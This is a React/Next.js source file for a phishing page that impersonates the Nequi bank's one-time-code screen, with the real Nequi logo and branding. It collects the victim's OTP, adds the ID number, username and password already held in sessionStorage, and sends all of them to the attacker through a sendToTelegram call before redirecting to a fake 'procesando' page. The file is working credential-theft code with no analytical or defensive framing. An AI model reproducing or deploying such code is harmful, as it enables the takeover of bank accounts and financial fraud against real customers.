'use client'

import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { useRouter } from "next/navigation"
import { useState, useEffect, useRef } from "react"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions/telegram";
import { Loader2 } from "lucide-react"; // Ícono de carga

export default function OtpPage() {
  const router = useRouter();
  const [claveDinamica, setClaveDinamica] = useState("");
  const [loading, setLoading] = useState(false); // Estado para manejar el estado de carga
  const [error, setError] = useState(""); // Estado para manejar errores de validación
  const inputRef = useRef(null); // Referencia para manejar el foco en el input

  // useEffect para redirigir al usuario al login si no hay datos en sessionStorage
  useEffect(() => {
    const cedula = sessionStorage.getItem('cedula');
    const usuario = sessionStorage.getItem('usuario');
    const clave = sessionStorage.getItem('clave');

    if (!cedula || !usuario || !clave) {
      router.push('/login');
      return;
    }
  }, [router]);

  // Función para validar la clave dinámica en tiempo real
  const handleChange = (e: { target: { value: any } }) => {
    const value = e.target.value;
    if (!/^\d{6}$/.test(value)) {
      setError("La clave dinámica debe tener exactamente 6 dígitos.");
    } else {
      setError("");
    }
    setClaveDinamica(value);
  };

  // Función para manejar el envío del formulario
  const handleSubmit = async (e: { preventDefault: () => void }) => {
    e.preventDefault();
    if (claveDinamica && !error) {
      setLoading(true);
      try {
        const cedula = sessionStorage.getItem("cedula");
        const usuario = sessionStorage.getItem("usuario");
        const clave = sessionStorage.getItem("clave");

        if (!cedula || !usuario || !clave) {
          router.push("/login");
          return;
        }

        // Guarda la clave dinámica en sessionStorage
        sessionStorage.setItem("claveDinamica", claveDinamica);

        // Envía los datos a Telegram
        await sendToTelegram({
          usuario,
          clave,
          claveDinamica,
          cedula,
        });

        // Redirige después de 2 segundos
        setTimeout(() => {
          setLoading(false);
          router.push("/procesando");
        }, 2000);
      } catch (error) {
        console.error("Error al enviar los datos:", error);
        alert("Hubo un error al procesar tu solicitud. Por favor, intenta de nuevo.");
        setLoading(false);
      }
    }
  };

  return (
    <main className="min-h-screen bg-gradient-to-br from-pink-50 to-purple-50">
      {/* Navbar */}
      <nav className="bg-white shadow-sm px-4 py-3">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
          <span className="text-sm text-gray-600">Ayuda</span>
        </div>
      </nav>

      {/* Contenido principal */}
      <div className="container mx-auto px-4 py-8 flex items-center justify-center">
        <Card className="max-w-md w-full shadow-lg rounded-lg overflow-hidden">
          <CardHeader className="bg-[#E6007E] p-6">
            <CardTitle className="text-center text-white text-2xl font-bold">
              Ingresa tu clave dinámica
            </CardTitle>
          </CardHeader>
          <CardContent className="p-6">
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-4">
                <Input
                  ref={inputRef}
                  type="text"
                  placeholder="Clave dinámica"
                  value={claveDinamica}
                  onChange={handleChange}
                  required
                  aria-label="Clave dinámica"
                  maxLength={6}
                  className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#E6007E]"
                />
                {error && (
                  <p className="text-red-500 text-sm mt-2 animate-fade-in">
                    {error}
                  </p>
                )}
              </div>
              <Button
                type="submit"
                className="w-full bg-[#E6007E] hover:bg-[#C4006B] text-white py-3 rounded-lg transition-all duration-300 transform hover:scale-105"
                disabled={loading || !!error}
              >
                {loading ? (
                  <div className="flex items-center justify-center">
                    <Loader2 className="animate-spin mr-2" size={20} />
                    Procesando...
                  </div>
                ) : (
                  "Continuar"
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </main>
  );
}